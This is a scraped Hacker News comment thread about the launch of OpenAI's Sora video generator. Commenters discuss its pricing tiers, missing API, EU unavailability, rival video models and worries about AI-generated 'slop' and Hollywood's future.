why didn't that affect DALL-E? Anyone with a more detailed understanding of this space have any ideas? reply ilaksh 16 minutes agoparentPart of it might also be capacity problems. reply fngjdflmdflg 52 minutes agoprevSerious question: is this better than current text-to-video models like Hailuo? reply TheRealPomax 51 minutes agoparentnext [3 more] [flagged] fngjdflmdflg 49 minutes agorootparentThe page says \"coming soon.\" I guess I'm wondering if there are any benchmarks or other way to compare this to current models. reply barbazoo 47 minutes agorootparentWe'll probably know once they release it. reply cube2222 47 minutes agoprevThere’s an ongoing related livestream[0]. [0]: https://youtu.be/2jKVx2vyZOY reply ren_engineer 24 minutes agoprevforced to finally release after that new open source model came out that was equal or better? reply optimalsolver 54 minutes agoprevWish they’d followed their previous MO of releasing stuff with no warning or buildup. Results won’t match the hype. reply minimaxir 48 minutes agoprevNo API/per video generation? Huh. reply Tiberium 39 minutes agoparentOpenAI almost always waits a few months before adding new features or models to the API, the same happened to DALL-E 3, advanced voice mode, and lots of smaller model updates and releases. reply owenpalmer 45 minutes agoparentprevIt's probably because they're relying heavily on their new editing UI to make the model useful. You can cut out weird parts of the videos and append a newly generated potion with a new prompt. reply remoquete 23 minutes agoprevAh, yes. We definitely needed another bad dreams generator. reply andybak 16 minutes agoparentInteresting creative people will produce interesting creative output. People with no taste will produce tasteless content. The mountain of slop will grow. And some of us have no intention of publishing any output whatsoever but just find the existence of these tools fascinating and inspiring. reply gburdell3 1 minute agorootparentAnd some of us have no intention of publishing any output and find the existence of these tools extremely worrying and problematic. reply remoquete 14 minutes agorootparentprevWhile it's indeed fascinating, part of me finds the sheer energy expenditure to be problematic, not to mention the \"Hollywood is dead\" innuendos. reply zb3 19 minutes agoprevno API = not good enough no pay per use = overpriced reply zb3 18 minutes agoparentnot available in the EU = might use everything you did there against you, sell that data to the higgest bidder reply rvz 48 minutes agoprevThat’s around more than 20+ VC-backed AI video generation startups destroyed in a microsecond and scrambling to compete against Sora in the race to zero. Many of them will die, but may the AI slop continue anyway. reply blackeyeblitzar 45 minutes agoparentIt’s a race to zero margin. The people who win will have lots of existing distribution channels (customers) or lots of money or control over data. Those who innovate but don’t have these things will be copied and run out of money eventually, as sad is it is. The competition between those startups and bigger players isn’t fair. reply hagbarth 45 minutes agoparentprevNot really a microsecond. Sora was announced months ago. reply marban 48 minutes agoprevNot available in the EU: https://help.openai.com/en/articles/10250692-sora-supported-... reply therealmarv 13 minutes agoparentDoes VPN solves the problem? I'm living in an EU country and I don't like that the EU decides for me (and companies like OpenAI or Meta don't give out their models to me)! I'm an old enough adult to decide for myself what I want... reply blfr 37 minutes agoparentprevWhat did the EU do this time? reply mhh__ 43 minutes agoprevUnless they drop something mega in the next few months can't help but think that openai's moat is basically gone for now at least. reply meetpateltech 51 minutes agoprevPricing: Plus Tier (20$/month) - Up to 50 priority videos (1,000 credits) - Up to 720p resolution and 5s duration Pro Tier (200$/month) - Up to 500 priority videos (10,000 credits) - Unlimited relaxed videos - Up to 1080p resolution, 20s duration and 5 concurrent generations - Download without watermark more info: https://help.openai.com/en/articles/10245774-sora-billing-cr... reply throwup238 19 minutes agoparentFrom the FAQ [1], too: >> Can I purchase more credits? > We currently don’t support the ability to purchase more credits on a one-time basis. > If you are on a ChatGPT Plus and would like to access more credits to use with Sora, you can upgrade to the Pro plan. Ouch. Looks like they're really pushing this ChatGPT pro subscription. Between the watermark and being unable to buy more credits, the plus plan is basically a small trial. [1] https://help.openai.com/en/articles/10245774-sora-billing-cr... reply cube2222 43 minutes agoparentprevWorth noting here that this is the existing ChatGPT subscription, you don’t need a separate one. reply jsheard 39 minutes agoparentprevCalled it, they were sitting on Sora until the $200 tier launched. Between the watermarking and 50 video limit the $20 tier is functionally a trial. reply dbspin 25 minutes agoparentprevWow they're watermarking videos and limiting them to 720 at the 20 dollar price point? That's a bold move, considering their competition's pricing... https://www.klingai.com/membership/membership-plan Quality seems relatively similar based on the samples I've seen. With the same issues - object permanence, temporal stability, physics comprehension etc, being present in both. Kling has no qualms about copyright violation however. reply minimaxir 16 minutes agorootparentAt OpenAI's $20/mo price point, you can also only generate 16 720p 5s videos per month. Kling doesn't seem to have more granular information publically but I suspect it allows for more than 16 videos per month. reply transformi 53 minutes agoprevNot impressive compare to the opensource video models out there, I anticipated some physics/VR capabilities, but it's basically just a marketing promotion to \"stay in the game\"... reply Geee 48 minutes agoparentWhat's the best open source video model right now? reply minimaxir 43 minutes agorootparentHunyan (https://replicate.com/tencent/hunyuan-video , $0.70/video) is the best but somewhat expensive. LTX (https://replicate.com/fofr/ltx-video , $0.10) is cheaper/faster but less capable. Both are permissively licensed. reply cooper_ganglia 41 minutes agorootparentprevHunyuan is a recent one that has looked pretty good. reply bbor 35 minutes agoparentprevI... can you explain, or point to some competitors...? To me this looks leagues ahead of everything else. But maybe I'm behind the game? AFAIK based on HuggingFace trending[1], the competitors are: - bytedance/animatediff-lightning: https://arxiv.org/pdf/2403.12706 (2.7M downloads in the past 30d, released in March) - genmo/mochi-1-preview: https://github-production-user-asset-6210df.s3.amazonaws.com... (21k downloads, released in October) - thudm/cogvideox-5b: https://huggingface.co/THUDM/CogVideoX-5b (128k downloads, released in August) Is there a better place to go? I'm very much not plugged into this part of LLMs, partially because it's just so damn spooky... EDIT: I now see the reply above referencing Hunyuan, which I didn't even know was its own model. Fair enough! I guess, like always, we'll just need to wait for release so people can run their own human-preference tests to definitively say which is better. Hunyuan does indeed seem good reply pearjuice 49 minutes agoprevThough I like the novelty of AI generated content, it kind of sucks dead internet theory is becoming more and more prevalent. YouTube (and all of the web) is already being spammed with AI generated slop and \"better\" video/text/audio models only make this worse. At some point we will cross the threshold of \"real\" and \"generated\" content being posted on the web and there's no stopping that. reply xena 47 minutes agoparentMy hope was that AI would make it easier for people to create new things that haven't been done before, but my fear was that it would just be an endless slop machine. We're living in the endless slop machine timeline and even genuine attempts to make something artistic end up just coming off as more slop. I love this timeline. reply visarga 36 minutes agorootparentEven if it's made with AI, it is slop only if you don't add anything original in your prompt, and don't spend much time selecting. The real competition of any new work is the backlog of decades of content that is instantly accessible. Of course it makes all content less valuable, you can always find something else. Hence the race for attention and the slop machine. It was actually invented by the ad driven revenue model. We should not project on AI something invented elsewhere. Even if gen AI could make original interesting works, the social network feeds would prioritize slop back again. So the problem is the way we let them control our feeds. reply minimaxir 25 minutes agorootparent> if you don't add anything original in your prompt Define \"original\". You could generate a pregnant Spongebob Squarepants and that would be original, but it would still be noise that doesn't inherently expand the creative space. > don't spend much time selecting That's the unexpected issue with the proliferation of generative AI now being accessible to nontechnical people. Most are lazy and go with the first generation that matches the vibe, which is the main reason why we have slop. reply 999900000999 30 minutes agorootparentprevImagine a movie like Napoleon, but instead of needing 100 million and thousands of extras, you just need 5 actors and maybe a budget of 50k. You could get something much more creative or historically accurate than whatever Hollywood deems marketable. I think about AI like any other tool. For example I make music using various software. Are drum machines cheating? Is electronic music computer sloop compared to playing each instrument. Is using a Mac and a 1k mic over a 30k studio cheating ? reply tguedes 28 minutes agoparentprevMy hope is that it will be the death of the aggregators and there will be more value in high quality and authentic content. The past 10-15 years has rewarded people who appeal to the aggregation algorithms and get the most views. Hopefully going forward theres going to be more organic, word of mouth recommendations of high quality content. reply skepticATX 31 minutes agoparentprevI felt this same way as image generation was rapidly improving, but I've been caught by surprise and impressed with how resilient we have been in the face of it. Turns out it's surprisingly, at least for me, to tune out the slop. Some platforms will fall victim to it (Google image search, for one), but new platforms will spring up to take their place. reply huijzer 42 minutes agoparentprevPut more weight on your subscriptions. I don’t have much AI content in my YouTube suggestions. (Good luck AI generating an interview with Chris Lattner or Stephen Kotkin for example. It won’t work.) reply yaj54 37 minutes agorootparentIt will work within thousands of days. reply patrick0d 46 minutes agoprevnext [2 more] [flagged] acureau 43 minutes agoparentI hope we get unlimited access for the reasonable price of a car note reply colesantiago 30 minutes agoprevHollywood's days are numbered. If you are a creative in this industry, start preparing to transition to another industry or adapt. Your boss is highly likely to be toying around with this. The first entirely AI generated film (with Sora or other AI video tools) to win an Oscar will be less than 5 years away. reply whynotminot 13 minutes agoparentNothing I'm seeing here looks like it's going to destroy Hollywood. I could see this tool maybe being used for generating establishing shots (generate a sweeping drone shot of a lighthouse looking out over a stormy sea), but then the actual talent work in a scene will be way more sensitive. The little details matter so much, and this feels so far from getting all of that right. Sure, this is the worst it will ever be, things will improve, etc, but if we've learned anything with AI, it's that the last mile is often the hardest. reply rideontime 10 minutes agoparentprevThe day that 90 minutes of 3-second dolly shots wins an Oscar is the day cinema dies. reply smithcoin 20 minutes agoparentprev> entirely What would you like to wager on this? reply do_not_redeem 19 minutes agoparentprevI'd take that bet at 10:1 odds. reply onlyrealcuzzo 13 minutes agorootparentI'd be careful. OpenAI could be a big enough bubble in less than 5 years to buy the Oscar winner, even if the film is terrible. reply rsynnott 7 minutes agoparentprev... Have you _seen_ the output from these things? I'm not sure actors need topic just yet. reply iamleppert 37 minutes agoprevYawn, there are literally 10 different apps and wannabe startups that do video generation and AI videos have already flooded social media. This doesn't look any better than what is and has been already available to the masses. OpenAI announced this ages ago and never did give people access, now competitors have already captured the AI generated video for social media slop market. We have yet to see any kind of AI created movie, like Toy Story was for computer 3D animation. OpenAI isn't a player in the video AI game, but certainly has bagged most of the money for it already (somehow). reply keiferski 35 minutes agoparentDon't just critique - link. What other video generation tools have you used and recommend? reply Workaccount2 30 minutes agorootparentThe subreddit /r/aivideo has tons of videos all tagged with what model was used to generate them. reply LanceJones 31 minutes agoparentprevSo you're saying there is literally nothing good about Sora? reply null_investor 9 minutes agoprev [–] I hope somebody pays 100.000 pro subscriptions and uses AI to request Sora to generate videos 24/7. Maybe Elon? Even if they use queues, I'm sure they are running at a loss and the GPU time is going to cost 100x more than what they charge. Creating false demand for AI can easily bankrupt their business, as they will believe people actually want to use that crap for that purpose. reply minimaxir 3 minutes agoparent [–] Deliberately wasting electricity isn't exactly a moral win. reply GuidelinesFAQListsAPISecurityLegalApply to YCContact Search:",
    "originSummary": [],
    "commentSummary": [
      "OpenAI's Sora video generation tool is receiving mixed reviews due to challenges in creating precise content, as current AI technology struggles with detailed prompts and motion accuracy.",
      "The tool is not yet available in the EU, and its release has faced server issues, affecting user experience.",
      "While some users appreciate the novelty and potential of AI-generated content, there are concerns about the quality and pricing structure, with some noting it lags behind competitors."
    ],
    "points": 198,
    "commentCount": 137,
    "retryCount": 0,
    "time": 1733767330
  }
]
